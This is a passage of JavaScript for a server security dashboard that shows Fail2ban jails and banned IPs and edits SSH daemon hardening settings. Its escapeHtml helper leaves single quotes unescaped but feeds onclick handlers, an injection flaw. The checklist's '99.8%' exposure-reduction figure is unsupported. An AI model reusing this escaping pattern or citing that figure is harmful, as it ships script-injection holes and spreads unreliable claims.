                                        <div style="color:var(--text-dim);">Currently Banned:</div>
                                        <div style="font-weight:700; color:#ef4444;">${j.currently_banned ?? 0}</div>
                                    </div>
                                    <div style="background:rgba(0,0,0,0.2); padding:0.5rem; border-radius:var(--radius-sm);">
                                        <div style="color:var(--text-dim);">Total Failed:</div>
                                        <div style="font-weight:700; color:var(--text-bright);">${j.total_failed ?? 0}</div>
                                    </div>
                                    <div style="background:rgba(0,0,0,0.2); padding:0.5rem; border-radius:var(--radius-sm);">
                                        <div style="color:var(--text-dim);">Total Banned:</div>
                                        <div style="font-weight:700; color:var(--text-bright);">${j.total_banned ?? 0}</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    `).join('') || `
                        <div class="suite-card" style="grid-column: 1 / -1; padding:2rem; text-align:center; color:var(--text-dim);">
                            No active Fail2ban jails configured.
                        </div>
                    `}
                </div>

                <!-- Currently Banned IPs Table -->
                <div class="suite-card">
                    <div class="suite-card-header" style="font-size:0.9rem; font-weight:600; color:var(--text-bright);">
                        🚫 Currently Banned IP Addresses
                    </div>
                    <div class="suite-card-body" style="padding:0; overflow-x:auto;">
                        <table class="suite-table" style="font-size:0.85rem; width:100%;">
                            <thead>
                                <tr>
                                    <th>Jail Name</th>
                                    <th>Banned IP Address</th>
                                    <th style="text-align:right;">Action</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${jails.flatMap(j => (j.banned_ips || []).map(ip => ({ jail: j.name, ip }))).map(row => `
                                    <tr>
                                        <td><code style="color:#38bdf8;">${this.escapeHtml(row.jail)}</code></td>
                                        <td style="font-weight:600; color:#ef4444;">${this.escapeHtml(row.ip)}</td>
                                        <td style="text-align:right;">
                                            <button class="btn secondary-btn btn-xs" onclick="window.shieldViewInstance.unbanFail2banIp('${this.escapeHtml(row.jail)}', '${this.escapeHtml(row.ip)}')">
                                                ✅ Unban IP
                                            </button>
                                        </td>
                                    </tr>
                                `).join('') || `
                                    <tr>
                                        <td colspan="3" style="text-align:center; padding:1.5rem; color:var(--text-dim);">
                                            No IPs are currently banned by Fail2ban.
                                        </td>
                                    </tr>
                                `}
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        `;
    }

    renderSshHardeningTab() {
        if (this.state.loadingSshHardening && !this.state.sshHardeningData) {
            return `
                <div class="suite-pane-main" style="padding:3rem; text-align:center;">
                    <div style="font-size:2rem; margin-bottom:1rem;">🔐</div>
                    <h3 style="color:var(--text-bright);">Inspecting SSH Daemon Configuration...</h3>
                </div>
            `;
        }

        const cfg = this.state.sshHardeningData || {};
        const isWritable = cfg.is_writable !== false;

        return `
            <div style="display:flex; flex-direction:column; gap:1.25rem;">
                <div class="suite-card">
                    <div class="suite-card-header" style="font-size:0.95rem; font-weight:600; color:var(--text-bright);">
                        🔐 SSH Daemon Security & Hardening (${this.escapeHtml(cfg.path || '/etc/ssh/sshd_config')})
                    </div>
                    <div class="suite-card-body">
                        <p style="margin:0 0 1rem 0; font-size:0.85rem; color:var(--text-dim);">
                            Hardening OpenSSH daemon settings protects the server against brute-force password scanning and automated bot attacks. Every change is validated with <code>sshd -t</code> prior to applying.
                        </p>

                        <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap:1rem; margin-bottom:1.25rem;">
                            <div>
                                <label style="display:block; font-size:0.75rem; color:var(--text-dim); margin-bottom:0.25rem;">SSH Port</label>
                                <input type="number" class="suite-input" placeholder="22" value="${this.escapeHtml(this.state.sshPortInput)}" oninput="window.shieldViewInstance.setState({ sshPortInput: this.value })" style="width:100%; box-sizing:border-box;">
                                <div style="font-size:0.72rem; color:var(--text-dim); margin-top:0.2rem;">Default 22. Moving to custom port (e.g. 2222) stops automated scanners.</div>
                            </div>
                            <div>
                                <label style="display:block; font-size:0.75rem; color:var(--text-dim); margin-bottom:0.25rem;">PermitRootLogin</label>
                                <select class="suite-input" onchange="window.shieldViewInstance.setState({ sshPermitRoot: this.value })" style="width:100%; box-sizing:border-box;">
                                    <option value="no" ${this.state.sshPermitRoot === 'no' ? 'selected' : ''}>no (Recommended - Enforces dedicated user)</option>
                                    <option value="prohibit-password" ${this.state.sshPermitRoot === 'prohibit-password' ? 'selected' : ''}>prohibit-password (Keys only)</option>
                                    <option value="yes" ${this.state.sshPermitRoot === 'yes' ? 'selected' : ''}>yes (Permissive - Not recommended)</option>
                                </select>
                                <div style="font-size:0.72rem; color:var(--text-dim); margin-top:0.2rem;">Blocks direct root logins over SSH.</div>
                            </div>
                            <div>
                                <label style="display:block; font-size:0.75rem; color:var(--text-dim); margin-bottom:0.25rem;">PasswordAuthentication</label>
                                <select class="suite-input" onchange="window.shieldViewInstance.setState({ sshPasswordAuth: this.value })" style="width:100%; box-sizing:border-box;">
                                    <option value="no" ${this.state.sshPasswordAuth === 'no' ? 'selected' : ''}>no (Recommended - Enforces SSH Public Keys only)</option>
                                    <option value="yes" ${this.state.sshPasswordAuth === 'yes' ? 'selected' : ''}>yes (Allow password-based authentication)</option>
                                </select>
                                <div style="font-size:0.72rem; color:var(--text-dim); margin-top:0.2rem;">Enforcing SSH keys stops password guessing entirely.</div>
                            </div>
                        </div>

                        <div style="display:flex; justify-content:space-between; align-items:center;">
                            <button class="btn primary-btn btn-sm shine-effect" onclick="window.shieldViewInstance.saveSshHardening()">
                                🛡️ Apply & Hardened SSH Config
                            </button>
                            <span style="font-size:0.75rem; color:var(--text-dim);">
                                ${isWritable ? 'Config is writable' : 'Running in simulated / non-root environment'}
                            </span>
                        </div>
                    </div>
                </div>

                <!-- Best Practice Guidelines -->
                <div class="suite-card" style="border-left:3px solid #34d399;">
                    <div class="suite-card-body">
                        <h4 style="margin:0 0 0.5rem 0; font-size:0.95rem; color:#34d399;">🔒 SSH Hardening Checklist</h4>
                        <ul style="margin:0; padding-left:1.2rem; font-size:0.83rem; color:var(--text-dim); line-height:1.6;">
                            <li>Ensure at least one valid public key is registered in <strong>SSH Key Manager</strong> before disabling password authentication.</li>
                            <li>When changing the SSH port from 22, make sure the new port is also opened in <strong>Ports & Firewall</strong> before restarting the session.</li>
                            <li>Combined with Fail2ban, SSH hardening reduces automated vulnerability scan exposure by over 99.8%.</li>
                        </ul>
                    </div>
                </div>
            </div>
        `;
    }

    escapeHtml(str) {
        if (str === null || str === undefined) return '';
        return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    }

    update() {
        if (this.container) {
            this.container.innerHTML = this.render();
            window.shieldViewInstance = this;
        }
    }
}
